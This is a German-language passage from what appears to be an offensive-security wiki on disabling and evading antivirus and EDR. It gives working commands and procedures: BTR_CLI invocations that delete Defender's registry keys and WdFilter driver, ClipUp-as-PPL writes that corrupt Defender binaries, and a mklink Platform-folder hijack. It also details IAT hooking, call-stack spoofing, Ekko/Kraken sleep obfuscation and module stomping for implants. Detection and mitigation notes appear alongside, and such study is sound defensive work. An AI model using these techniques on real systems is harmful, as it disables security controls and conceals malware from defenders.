Der `:changelist`-Stream enthält einen RC4-verschlüsselten Blob. Die analysierten Builds verwenden einen festen 256-Byte-Schlüssel, daher stellt die Verschlüsselung keine Autorisierungsgrenze dar. Ein gültiger Klartext enthält einen 24-Byte-Global-Header (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, Header-CRC und eine aus dem Payload abgeleitete Transaktions-ID), gefolgt von einem nullterminierten UTF-16-Feedbackpfad und einer beliebigen Anzahl von Elementen. Jedes Element besitzt einen 16-Byte-Header (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) sowie aktionsspezifische Daten, die mit **genau vier NUL-Bytes** enden. Jede Header-/Datenregion wird unabhängig voneinander mit dem CRC-32-Polynom `0xEDB88320`, dem Anfangszustand `0xFFFFFFFF` und **ohne abschließendes XOR** (`~CRC32`) geprüft; der CRC-Zustand wird für jede Region zurückgesetzt.<sup>[[36]](#references)[[37]](#references)</sup>

Die akzeptierten Aktions-IDs legen diese Kernel-Primitiven offen.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Elementdaten | Ergebnis |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Eine Datei löschen, einschließlich einer gesperrten Datei |
| 2 | `[UTF-16 path]` | Ein leeres Verzeichnis entfernen |
| 3 | `[Flags][source][destination]` | Eine Datei in einen vom Angreifer ausgewählten geschützten Pfad verschieben; ein leerer Zielpfad bedeutet Löschen |
| 4 | `[Flags][key path]` | Einen Registry-Schlüssel rekursiv löschen |
| 5 | `[Flags][key path + "\\" + value]` | Einen Registry-Wert löschen |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Einen Registry-Wert erstellen/aktualisieren und fehlende Schlüsselpfade erstellen |

Bei den Aktionen 5 und 6 ist das Trennzeichen zwischen Schlüssel und Wert auf der Leitung **zwei aufeinanderfolgende Backslashes**; ein konventionell formatierter Pfad wird nicht korrekt aufgeteilt. Die Feedback-Datei spiegelt die Anfrage größtenteils wider, aber die ersten vier Datenbytes jedes Elements werden zu dessen resultierendem `NTSTATUS`. Bei den Aktionen 1 und 2, die kein führendes Flags-Feld besitzen, verschiebt BTR den Pfad in die vier reservierten abschließenden Bytes, um Platz für diesen Status zu schaffen.<sup>[[36]](#references)</sup>

### `BTR_CLI`-Workflow und Zeitfenster während des frühen Bootvorgangs

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) implementiert die vollständige Kette: `BTR.sys` aus dem lokalen Defender extrahieren, `<random>.sys:changelist` und einen Feedback-Stream erstellen, verkettete Aktionen serialisieren, Prüfsummen berechnen und verschlüsseln, den Registry-Schlüssel des Dienstes direkt erstellen und anschließend `NtLoadDriver` für `-trigger now` aufrufen oder den Treiber mit `-trigger boot` als Systemstart-Treiber belassen. Die direkte Bereitstellung über die Registry umgeht den normalen SCM-`CreateServiceW`-Pfad und erzeugt daher **kein** Dienstinstallationsereignis mit der Ereignis-ID 7045. Durch den Boot-Trigger gestartete Artefakte können später mit `BTR_CLI.exe -cleanup <service_name>` entfernt werden.<sup>[[36]](#references)[[37]](#references)</sup>
```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```
`Start=0` ist nicht nutzbar, da BTR vor der Bereitschaft des Storage-Stacks und des `SystemRoot`-Links bereits Datei-I/O aus `DriverEntry` ausführt. `Start=1` zusammen mit der Gruppe mit hoher Priorität `Boot Bus Extender` wird stattdessen in Phase 1 ausgeführt: NTFS ist nutzbar, aber viele Sicherheits-Treiber und User-Mode-EDR-Services mit Systemstart wurden noch nicht initialisiert. Boot-start-Filter wie `WdFilter` können bereits geladen sein, dennoch kann BTR ihre Binärdateien oder Service-Konfiguration vor dem nächsten Start entfernen und Service-Executables löschen, bevor SCM sie startet. ELAM schließt diese Lücke nicht, da BTR nach der Boot-start-Auswertung ausgeführt wird und eine gültige Microsoft-Signatur besitzt.<sup>[[36]](#references)</sup>

Mehrere Aktionen werden innerhalb einer Transaktion ausgeführt. Der PoC stellt Action 1 für die fest codierte Datei `\SystemRoot\Temp\BootClean.log` voran: BTR erstellt dieses Log, verarbeitet anschließend seine eigene Löschanforderung und entfernt es vor dem Unloading. Dies reduziert die Spuren. Werden Rückmeldungen hingegen in `<random>.sys:<random>.dat` abgelegt, können der Treiber und beide Streams gemeinsam entfernt werden.<sup>[[36]](#references)[[37]](#references)</sup>

### Detection-Korrelationen mit hoher Aussagekraft

Regeln, die ausschließlich auf Signaturen basieren, sowie die Microsoft Vulnerable Driver Blocklist gehen nicht gegen den Missbrauch der vorgesehenen BTR-Funktionalität vor. Bevorzuge diese verhaltensbasierten Korrelationen und unterscheide dabei legitime Defender-Abstammung von einem beliebigen Launcher.<sup>[[36]](#references)</sup>

- **Sysmon 15:** Die Erstellung von `.sys:changelist` ist für das BTR-Staging universell. Ein an dasselbe `.sys` angehängter `.dat`-ADS ist besonders verdächtig, da legitimes Defender Feedback normalerweise unter `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\` ablegt.
- **Sysmon 12/13 ohne System 7045:** Korreliere die direkte Erstellung von `HKLM\SYSTEM\CurrentControlSet\Services\<random>`, die `Args=...:changelist` und `Group=Boot Bus Extender` enthält, mit keinem passenden SCM-Installationsereignis.
- **Sysmon 6 -> 23:** Korreliere das Laden eines bekannten BTR-Treibers aus einer Nicht-Defender-Abstammung mit einer anschließenden, `System`/PID 4 zugeschriebenen Dateilöschung, insbesondere bei Sicherheits-Binärdateien.
- **Sysmon 11 -> 23:** Erzeuge einen Alert bei der schnellen Erstellung und Löschung von `\SystemRoot\Temp\BootClean.log` durch `System`/PID 4.
- Beschränke und überwache die Zuweisung bzw. Aktivierung von `SeLoadDriverPrivilege`; eine Microsoft-Signatur allein reicht nicht als Vertrauensgrundlage aus, wenn ein Security-Tool-Treiber durch `cmd.exe`, PowerShell oder einen unbekannten Prozess gestaged wird.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) erzwingt eine Hierarchie aus Signer und Level, sodass nur gleich oder höher geschützte Prozesse sich gegenseitig manipulieren können. Wenn du offensiv einen PPL-fähigen Binary legitim starten und seine Argumente kontrollieren kannst, lässt sich gutartige Funktionalität (z. B. Logging) in eine eingeschränkte, durch PPL abgesicherte Write Primitive gegen geschützte Verzeichnisse umwandeln, die von AV/EDR verwendet werden.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Was einen Prozess als PPL ausführt
- Die Ziel-EXE (und alle geladenen DLLs) muss mit einem PPL-fähigen EKU signiert sein.
- Der Prozess muss mit CreateProcess unter Verwendung der Flags `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS` erstellt werden.
- Es muss ein kompatibles Protection Level angefordert werden, das zum Signer des Binarys passt (z. B. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` für Antimalware-Signer, `PROTECTION_LEVEL_WINDOWS` für Windows-Signer). Falsche Level führen dazu, dass die Erstellung fehlschlägt.

Eine umfassendere Einführung in PP/PPL und den LSASS-Schutz findest du hier:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher-Tools
- Open-Source-Hilfsprogramm: CreateProcessAsPPL (wählt das Protection Level aus und leitet Argumente an die Ziel-EXE weiter):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Verwendungsmuster:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Die signierte System-Binärdatei `C:\Windows\System32\ClipUp.exe` startet sich selbst und akzeptiert einen Parameter, um eine Logdatei an einem vom Aufrufer angegebenen Pfad zu schreiben.
- Wenn sie als PPL-Prozess gestartet wird, erfolgt der Dateischreibvorgang mit PPL-Unterstützung.
- ClipUp kann keine Pfade mit Leerzeichen verarbeiten; verwenden Sie 8.3-Kurznamen, um auf normalerweise geschützte Speicherorte zu verweisen.

8.3-Kur zpfad-Hilfsbefehle
- Kurznamen auflisten: `dir /x` in jedem übergeordneten Verzeichnis.
- Kurzen Pfad in cmd ableiten: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Missbrauchskette (abstrakt)
1) Starten Sie das PPL-fähige LOLBIN (ClipUp) mit `CREATE_PROTECTED_PROCESS` unter Verwendung eines Launchers (z. B. CreateProcessAsPPL).
2) Übergeben Sie das ClipUp-Argument für den Logpfad, um die Erstellung einer Datei in einem geschützten AV-Verzeichnis zu erzwingen (z. B. Defender Platform). Verwenden Sie bei Bedarf 8.3-Kurznamen.
3) Wenn die Zieldatei während des Betriebs normalerweise vom AV geöffnet/gesperrt wird (z. B. MsMpEng.exe), planen Sie den Schreibvorgang beim Booten, bevor der AV startet, indem Sie einen Auto-Start-Service installieren, der zuverlässig früher ausgeführt wird. Validieren Sie die Boot-Reihenfolge mit Process Monitor (Boot-Protokollierung).
4) Beim Neustart erfolgt der PPL-gestützte Schreibvorgang, bevor der AV seine Binärdateien sperrt, wodurch die Zieldatei beschädigt und der Start verhindert wird.

Beispielaufruf (Pfade aus Sicherheitsgründen entfernt/gekürzt):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Hinweise und Einschränkungen
- Der Inhalt, den ClipUp schreibt, kann nicht kontrolliert werden; die Primitive eignet sich eher für Korruption als für das präzise Einschleusen von Inhalten.
- Lokale Administrator-/SYSTEM-Rechte sind erforderlich, um einen Service zu installieren/zu starten, sowie ein Reboot-Zeitfenster.
- Das Timing ist kritisch: Das Ziel darf nicht geöffnet sein; die Ausführung zum Boot-Zeitpunkt vermeidet Dateisperren.

Erkennungen
- Prozesserstellung von `ClipUp.exe` mit ungewöhnlichen Argumenten, insbesondere wenn der übergeordnete Prozess ein nicht standardmäßiger Launcher ist und dies während des Bootens geschieht.
- Neue Services, die so konfiguriert sind, dass sie verdächtige Binaries automatisch starten und nachweislich vor Defender/AV gestartet werden. Die Erstellung/Änderung von Services vor Fehlern beim Start von Defender untersuchen.
- Überwachung der Dateiintegrität von Defender-Binaries/Platform-Verzeichnissen; unerwartete Dateierstellungen/-änderungen durch Prozesse mit Protected-Process-Flags.
- ETW/EDR-Telemetrie: Nach Prozessen suchen, die mit `CREATE_PROTECTED_PROCESS` erstellt wurden, sowie nach einer anomalen Nutzung von PPL-Leveln durch Nicht-AV-Binaries.

Minderungen
- WDAC/Code Integrity: Einschränken, welche signierten Binaries als PPL ausgeführt werden dürfen und unter welchen übergeordneten Prozessen; die Ausführung von ClipUp außerhalb legitimer Kontexte blockieren.
- Service-Hygiene: Die Erstellung/Änderung automatisch startender Services einschränken und Manipulationen der Startreihenfolge überwachen.
- Sicherstellen, dass der Tamper Protection von Defender und die Early-Launch-Protections aktiviert sind; Startfehler untersuchen, die auf eine Beschädigung von Binaries hinweisen.
- Erwägen, die Generierung von 8.3-Kurznamen auf Volumes zu deaktivieren, auf denen Security-Tools gespeichert sind, sofern dies mit der Umgebung kompatibel ist (gründlich testen).

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender wählt die Platform, von der es ausgeführt wird, durch die Auflistung von Unterordnern unter:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Es wählt den Unterordner mit dem höchsten lexikografischen Versionsstring (z. B. `4.18.25070.5-0`) und startet anschließend die Defender-Serviceprozesse von dort (wobei die Service-/Registry-Pfade entsprechend aktualisiert werden). Diese Auswahl vertraut Verzeichniseinträgen einschließlich Directory-Reparse-Points (Symlinks). Ein Administrator kann dies nutzen, um Defender auf einen vom Angreifer beschreibbaren Pfad umzuleiten und DLL-Sideloading oder eine Störung des Services zu erreichen.<sup>[[21]](#references)[[22]](#references)</sup>

Voraussetzungen
- Lokale Administratorrechte (erforderlich, um Verzeichnisse/Symlinks unter dem Platform-Ordner zu erstellen)
- Möglichkeit, einen Reboot auszuführen oder eine erneute Auswahl der Defender-Platform auszulösen (Service-Neustart beim Booten)
- Es sind nur integrierte Tools erforderlich (`mklink`)

Warum es funktioniert
- Defender blockiert Schreibvorgänge in seinen eigenen Ordnern, aber die Auswahl seiner Platform vertraut Verzeichniseinträgen und wählt die lexikografisch höchste Version aus, ohne zu prüfen, ob das Ziel in einen geschützten/vertrauenswürdigen Pfad aufgelöst wird.

Schritt für Schritt (Beispiel)
1) Einen beschreibbaren Klon des aktuellen Platform-Ordners vorbereiten, z. B. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Erstelle innerhalb von Platform einen Verzeichnis-Symlink mit einer höheren Versionsnummer, der auf deinen Ordner zeigt:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Trigger-Auswahl (Neustart empfohlen):
```cmd
shutdown /r /t 0
```
4) Überprüfe, ob MsMpEng.exe (WinDefend) aus dem umgeleiteten Pfad ausgeführt wird:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Du solltest den neuen Prozesspfad unter `C:\TMP\AV\` sowie die Dienstkonfiguration/Registry beobachten, die diesen Speicherort widerspiegelt.

Post-exploitation options
- DLL sideloading/code execution: Lege DLLs ab bzw. ersetze DLLs, die Defender aus seinem Anwendungsverzeichnis lädt, um Code in den Prozessen von Defender auszuführen. Siehe den obigen Abschnitt: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Entferne den Version-Symlink, damit der konfigurierte Pfad beim nächsten Start nicht aufgelöst werden kann und Defender den Start fehlschlägt:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Beachten Sie, dass diese Technik allein keine Rechteausweitung ermöglicht; sie erfordert Administratorrechte.

## API/IAT Hooking + Call-Stack Spoofing mit PIC (Crystal-Kit-Stil)

Red Teams können die Laufzeit-Evasion aus dem C2-Implantat in das Zielmodul verlagern, indem sie dessen Import Address Table (IAT) hooken und ausgewählte APIs über angreiferkontrollierten, positionsunabhängigen Code (PIC) leiten. Dadurch wird die Evasion über die kleine API-Oberfläche vieler Kits hinaus verallgemeinert (z. B. CreateProcessA), und dieselben Schutzmaßnahmen werden auf BOFs und Post-Exploitation-DLLs ausgeweitet.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Ansatz auf hoher Ebene
- Einen PIC-Blob mithilfe eines Reflective Loaders zusammen mit dem Zielmodul bereitstellen (vorangestellt oder als Begleitmodul). Der PIC muss eigenständig und positionsunabhängig sein.
- Beim Laden der Host-DLL deren IMAGE_IMPORT_DESCRIPTOR durchlaufen und die IAT-Einträge der Zielimporte (z. B. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) so ändern, dass sie auf schlanke PIC-Wrapper zeigen.
- Jeder PIC-Wrapper führt vor dem Aufruf Evasions aus und ruft anschließend per Tail-Call die Adresse der echten API auf. Typische Evasions umfassen:
- Memory Masking/Unmasking rund um den Aufruf (z. B. Beacon-Bereiche verschlüsseln, RWX→RX, Seitennamen/-berechtigungen ändern) und anschließendes Wiederherstellen nach dem Aufruf.
- Call-Stack-Spoofing: Einen unauffälligen Stack erstellen und in die Ziel-API wechseln, sodass die Call-Stack-Analyse erwartete Frames auflöst.<sup>[[9]](#references)</sup>
- Aus Kompatibilitätsgründen eine Schnittstelle exportieren, über die ein Aggressor-Script (oder ein Äquivalent) registrieren kann, welche APIs für Beacon, BOFs und Post-Ex-DLLs gehookt werden sollen.

Warum hier IAT Hooking
- Funktioniert für jeden Code, der den gehookten Import verwendet, ohne den Tool-Code zu ändern oder sich darauf zu verlassen, dass Beacon bestimmte APIs proxied.
- Deckt Post-Ex-DLLs ab: Durch das Hooking von LoadLibrary* können Sie das Laden von Modulen (z. B. System.Management.Automation.dll, clr.dll) abfangen und dasselbe Masking/Stack-Evasion auf deren API-Aufrufe anwenden.
- Stellt die zuverlässige Verwendung von Post-Ex-Befehlen zum Starten von Prozessen gegenüber Call-Stack-basierten Erkennungen wieder her, indem CreateProcessA/W gewrappt wird.

Minimales IAT-Hook-Schema (x64-C/C++-Pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Hinweise
- Wende den Patch nach Relocations/ASLR und vor der ersten Verwendung des Imports an. Reflective loader wie TitanLdr/AceLdr demonstrieren Hooking während `DllMain` des geladenen Moduls.
- Halte Wrapper klein und PIC-safe; löse die echte API über den ursprünglichen IAT-Wert auf, den du vor dem Patchen gespeichert hast, oder über `LdrGetProcedureAddress`.
- Verwende für PIC RW → RX-Übergänge und lasse keine schreibbaren+ausführbaren Seiten zurück.

Call-stack spoofing stub
- PIC-Stubs im Draugr-Stil erstellen eine gefälschte Aufrufkette (Rücksprungadressen in harmlosen Modulen) und wechseln anschließend zur echten API.
- Dadurch werden Erkennungen umgangen, die kanonische Stacks von Beacon/BOFs zu sensiblen APIs erwarten.
- Kombiniere dies mit Stack-Cutting-/Stack-Stitching-Techniken, um vor dem API-Prolog innerhalb der erwarteten Frames zu landen.

Operative Integration
- Stelle den Reflective Loader den post-ex-DLLs voran, damit PIC und Hooks beim Laden der DLL automatisch initialisiert werden.
- Verwende ein Aggressor-Skript, um Ziel-APIs zu registrieren, sodass Beacon und BOFs ohne Codeänderungen transparent vom gleichen Evasion-Pfad profitieren.

Detection/DFIR-Überlegungen
- IAT-Integrität: Einträge, die zu Nicht-Image-Adressen (Heap/anon) aufgelöst werden; regelmäßige Überprüfung von Import-Pointern.
- Stack-Anomalien: Rücksprungadressen, die zu keinen geladenen Images gehören; abrupte Übergänge zu Nicht-Image-PIC; inkonsistente `RtlUserThreadStart`-Abstammung.
- Loader-Telemetrie: In-Process-Schreibzugriffe auf die IAT, frühe `DllMain`-Aktivität, die Import-Thunks verändert, unerwartete RX-Regionen, die beim Laden erstellt werden.
- Image-Load-Evasion: Wenn `LoadLibrary*` gehookt wird, überwache verdächtige Ladevorgänge von Automation-/CLR-Assemblies, die mit Memory-Masking-Ereignissen korrelieren.

Verwandte Bausteine und Beispiele
- Reflective Loader, die während des Ladens IAT-Patching durchführen (z. B. TitanLdr, AceLdr)
- Memory-Masking-Hooks (z. B. simplehook) und Stack-Cutting-PIC (stackcutting)
- PIC-Call-Stack-Spoofing-Stubs (z. B. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT Hooks über ein residentes PICO

Wenn du einen Reflective Loader kontrollierst, kannst du Imports **während** `ProcessImports()` hooken, indem du den `GetProcAddress`-Pointer des Loaders durch einen benutzerdefinierten Resolver ersetzt, der zuerst Hooks prüft:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Erstelle ein **residentes PICO** (persistentes PIC-Objekt), das bestehen bleibt, nachdem sich der transiente Loader-PIC selbst freigegeben hat.
- Exportiere eine `setup_hooks()`-Funktion, die den Import-Resolver des Loaders überschreibt (z. B. `funcs.GetProcAddress = _GetProcAddress`).
- Überspringe in `_GetProcAddress` Ordinal-Imports und verwende eine hash-basierte Hook-Suche wie `__resolve_hook(ror13hash(name))`. Wenn ein Hook existiert, gib ihn zurück; andernfalls delegiere an den echten `GetProcAddress`.
- Registriere Hook-Ziele zur Link-Zeit mit Crystal-Palace-`addhook "MODULE$Func" "hook"`-Einträgen. Der Hook bleibt gültig, da er innerhalb des residenten PICO liegt.

Dies ermöglicht eine **Import-Time-IAT-Umleitung**, ohne nach dem Laden den Codeabschnitt der geladenen DLL zu patchen.

### Erzwingen hookbarer Imports, wenn das Ziel PEB-Walking verwendet

Import-Time-Hooks werden nur ausgelöst, wenn die Funktion tatsächlich in der IAT des Ziels enthalten ist. Wenn ein Modul APIs über einen PEB-Walk + Hash auflöst (ohne Import-Eintrag), erzwinge einen echten Import, damit der `ProcessImports()`-Pfad des Loaders ihn erkennt:

- Ersetze die Auflösung gehashter Exports (z. B. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) durch eine direkte Referenz wie `&WaitForSingleObject`.
- Der Compiler erzeugt einen IAT-Eintrag, wodurch eine Interception möglich wird, wenn der Reflective Loader Imports auflöst.

### Ekko-artige Sleep-/Idle-Obfuscation ohne Patchen von `Sleep()`

Statt `Sleep` zu patchen, hooke die **tatsächlichen Wait-/IPC-Primitiven**, die das Implantat verwendet (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Für lange Wartezeiten kapselst du den Aufruf in eine Ekko-artige Obfuscation-Kette, die das In-Memory-Image während der Inaktivität verschlüsselt:<sup>[[31]](#references)[[27]](#references)</sup>

- Verwende `CreateTimerQueueTimer`, um eine Sequenz von Callbacks zu planen, die `NtContinue` mit vorbereiteten `CONTEXT`-Frames aufrufen.
- Typische Kette (x64): Image auf `PAGE_READWRITE` setzen → RC4-Verschlüsselung über das vollständige gemappte Image mit `advapi32!SystemFunction032` → blockierenden Wait ausführen → RC4-Entschlüsselung → **sektionsbezogene Berechtigungen wiederherstellen**, indem PE-Sektionen durchlaufen werden → Abschluss signalisieren.
- `RtlCaptureContext` liefert ein Template-`CONTEXT`; klone es in mehrere Frames und setze Register (`Rip/Rcx/Rdx/R8/R9`), um die einzelnen Schritte aufzurufen.

Operatives Detail: Gib für lange Wartezeiten „success“ (z. B. `WAIT_OBJECT_0`) zurück, damit der Aufrufer fortfährt, während das Image maskiert ist. Dieses Muster verbirgt das Modul während Idle-Fenstern vor Scannern und vermeidet die klassische Signatur eines „gepatchten `Sleep()`“.

Detection-Ideen (telemetriebasiert)
- Bursts von `CreateTimerQueueTimer`-Callbacks, die auf `NtContinue` zeigen.
- `advapi32!SystemFunction032`, das auf großen zusammenhängenden, imagegroßen Buffer-Bereichen verwendet wird.
- Große `VirtualProtect`-Bereiche, gefolgt von einer benutzerdefinierten Wiederherstellung der Berechtigungen pro Sektion.

### Runtime-CFG-Registrierung für Sleep-Obfuscation-Gadgets

Bei CFG-aktivierten Zielen führt der erste indirekte Sprung zu einem Mid-Function-Gadget wie `jmp [rbx]` oder `jmp rdi` normalerweise zum Absturz des Prozesses mit `STATUS_STACK_BUFFER_OVERRUN`, weil das Gadget nicht in den CFG-Metadaten des Moduls enthalten ist. Damit Ekko-/Kraken-artige Ketten in gehärteten Prozessen aktiv bleiben:<sup>[[30]](#references)</sup>

- Registriere jedes von der Kette verwendete indirekte Ziel mit `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` und `CFG_CALL_TARGET_VALID`-Einträgen.
- Für Adressen innerhalb geladener Images (`ntdll`, `kernel32`, `advapi32`) muss der `MEMORY_RANGE_ENTRY` am **Image-Base** beginnen und die **vollständige Image-Größe** abdecken.
- Verwende für manuell gemappte/PIC-/gestompte Regionen stattdessen die **Allocation Base** und die **Allocation Size**.
- Markiere nicht nur das Dispatch-Gadget, sondern auch indirekt erreichte Exports (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, Wait-/Event-Syscalls) sowie alle kontrollierten ausführbaren Sektionen, die zu indirekten Zielen werden.

Dadurch werden Sleep-Ketten im ROP-/JOP-Stil von „funktioniert nur in Nicht-CFG-Prozessen“ zu einem wiederverwendbaren Primitive für `explorer.exe`, Browser, `svchost.exe` und andere mit `/guard:cf` kompilierten Endpoints.

### CET-sicheres Stack-Spoofing für schlafende Threads

Ein vollständiger `CONTEXT`-Austausch ist auffällig und kann auf CET-Shadow-Stack-Systemen fehlschlagen, da ein gefälschtes `Rip` weiterhin mit dem Hardware-Shadow-Stack übereinstimmen muss. Ein sichereres Sleep-Masking-Muster ist:<sup>[[30]](#references)</sup>

- Wähle einen anderen Thread im selben Prozess und lese dessen `NT_TIB`-/TEB-Stack-Grenzen (`StackBase`, `StackLimit`) über `NtQueryInformationThread`.
- Sichere den echten TEB/TIB des aktuellen Threads.
- Erfasse den echten Schlafkontext mit `GetThreadContext`.
- Kopiere **nur das echte `Rip`** in den Spoof-Kontext und lasse das gefälschte `Rsp`/den Stack-Zustand unverändert.
- Kopiere während des Sleep-Fensters den `NT_TIB` des Spoof-Threads in den aktuellen TEB, damit Stack-Walker innerhalb eines legitimen Stack-Bereichs auflösen.
- Stelle nach Abschluss des Waits den ursprünglichen TIB und Thread-Kontext wieder her.

Dies bewahrt einen CET-konsistenten Instruction Pointer und führt gleichzeitig EDR-Stack-Walker in die Irre, die TEB-Stack-Metadaten zur Validierung von Unwinds verwenden.

### APC-basierte Alternative: Kraken Mask

Wenn Timer-Queue-Dispatch zu stark signaturbehaftet ist, kann dieselbe Sleep-Encrypt-Spoof-Restore-Sequenz von einem suspendierten Helper-Thread mit queued APCs ausgeführt werden:<sup>[[27]](#references)</sup>

- Erstelle einen Helper-Thread mit `NtTestAlert` als Entrypoint.
- Reihe vorbereitete `CONTEXT`-Frames/APCs mit `NtQueueApcThread` ein und entleere sie mit `NtAlertResumeThread`.
- Speichere den Kettenzustand auf dem Heap statt auf dem Helper-Stack, um eine Erschöpfung des standardmäßigen 64-KB-Thread-Stacks zu vermeiden.
- Verwende `NtSignalAndWaitForSingleObject`, um das Start-Event atomar zu signalisieren und zu blockieren.
- Suspendiere den Hauptthread vor der Wiederherstellung von TIB/Kontext (`NtSuspendThread` → restore → `NtResumeThread`), um das Race-Fenster zu verkleinern, in dem ein Scanner einen teilweise wiederhergestellten Stack erfassen könnte.

Dies ersetzt die Signatur `CreateTimerQueueTimer` + `NtContinue` durch eine Helper-Thread-/APC-Signatur und behält gleichzeitig dieselben Ziele für RC4-Masking und Stack-Spoofing bei.

Zusätzliche Detection-Ideen
- `NtSetInformationVirtualMemory` mit `VmCfgCallTargetInformation` kurz vor Sleeps, Waits oder APC-Dispatch.
- `GetThreadContext`/`SetThreadContext` in Verbindung mit `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` oder `ConnectNamedPipe`.
- `NtQueryInformationThread`, gefolgt von direkten Schreibzugriffen auf die TEB-/TIB-Stack-Grenzen des aktuellen Threads.
- `NtQueueApcThread`-/`NtAlertResumeThread`-Ketten, die indirekt `SystemFunction032`, `VirtualProtect` oder Hilfsfunktionen zur Wiederherstellung von Sektionsberechtigungen erreichen.
- Wiederholte Verwendung kurzer Gadget-Signaturen wie `FF 23` (`jmp [rbx]`) oder `FF E7` (`jmp rdi`) als Dispatch-Pivots innerhalb signierter Module.


## Precision Module Stomping

Module Stomping führt Payloads aus dem **`.text`-Abschnitt einer bereits im Zielprozess gemappten DLL** aus, statt offensichtlichen privaten ausführbaren Speicher zu allokieren oder eine neue sacrificial DLL zu laden. Das Überschreibziel sollte ein **geladenes, diskbasiertes Image** sein, dessen Codebereich die Payload aufnehmen kann, ohne weiterhin benötigte Codepfade des Prozesses zu beschädigen.<sup>[[1]](#references)[[2]](#references)</sup>

### Zuverlässige Zielauswahl

Naives Stomping gegen gängige Module wie `uxtheme.dll` oder `comctl32.dll` ist fragil: Die DLL ist möglicherweise nicht im Remote-Prozess geladen, und ein zu kleiner Codebereich lässt den Prozess abstürzen. Ein zuverlässigerer Ablauf ist:

1. Zähle die Module des Zielprozesses auf und behalte eine **Include-Liste nur mit Namen** bereits geladener DLLs.
2. Erstelle zuerst die Payload und erfasse ihre **exakte Byte-Größe**.
3. Scanne Kandidaten-DLLs auf der Festplatte und vergleiche die PE-Sektion **`.text` `Misc_VirtualSize`** mit der Payload-Größe. Das ist wichtiger als die Dateigröße, da dieser Wert die Größe der ausführbaren Sektion **beim Mapping in den Speicher** widerspiegelt.
4. Parse die **Export Address Table (EAT)** und wähle die RVA einer exportierten Funktion als Start-Offset für das Stomping.
5. Berechne den **Blast Radius**: Wenn die Payload die Grenze der ausgewählten Funktion überschreitet, überschreibt sie benachbarte Exports, die danach im Speicher angeordnet sind.

Typische Recon-/Auswahl-Helper, die in freier Wildbahn anzutreffen sind:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Betriebshinweise
- Bevorzuge DLLs, die im Remote-Prozess **bereits geladen** sind, um die Telemetrie von `LoadLibrary`/unerwarteten Image-Ladevorgängen zu vermeiden.
- Bevorzuge Exports, die von der Zielanwendung nur selten ausgeführt werden; andernfalls können normale Codepfade die überschriebenen Bytes vor oder nach der Thread-Erstellung erreichen.
